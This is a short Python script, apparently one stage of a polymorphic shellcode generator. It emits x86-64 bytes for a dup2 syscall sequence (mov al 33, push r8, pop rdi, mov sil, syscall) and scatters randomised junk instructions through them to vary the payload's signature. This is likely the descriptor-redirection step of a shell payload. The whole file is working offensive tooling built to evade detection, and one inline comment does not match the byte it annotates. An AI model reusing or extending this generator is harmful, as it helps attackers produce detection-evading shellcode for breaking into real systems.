#!/usr/bin/env python3
import random
from func_instu import *

def partie5():

    x = random.randint(0, 1)

    if x == 0:
        resultat = movx('al', 33)
    else :
        rdmxor = randomxor('al')
        moval = movx('al', 33)
        resultat = rdmxor + moval

    pushr8 = '\\x41\\x50' # push r8
    poprdi = '\\x5f' # pop rdi
    movsil = movx('sil',1) # mov sil, 2
    syscall = '\\x0f\\x05' # syscall

    resultat_concat = resultat + pushr8 + poprdi + movsil + syscall
    
    y = random.randint(0, 2)
    
    match y : 
        case 0 :
            resultat_concat = resultat + full_random() + pushr8 + poprdi +  movsil + syscall
        case 1 : 
            resultat_concat = resultat + full_random() + pushr8 + full_random() + poprdi + movsil + syscall
        case 2 :
            resultat_concat = resultat + full_random() + pushr8 + poprdi + full_random() + movsil + full_random() + syscall


    print("partie 5:", resultat_concat)
    print("")

    return resultat_concat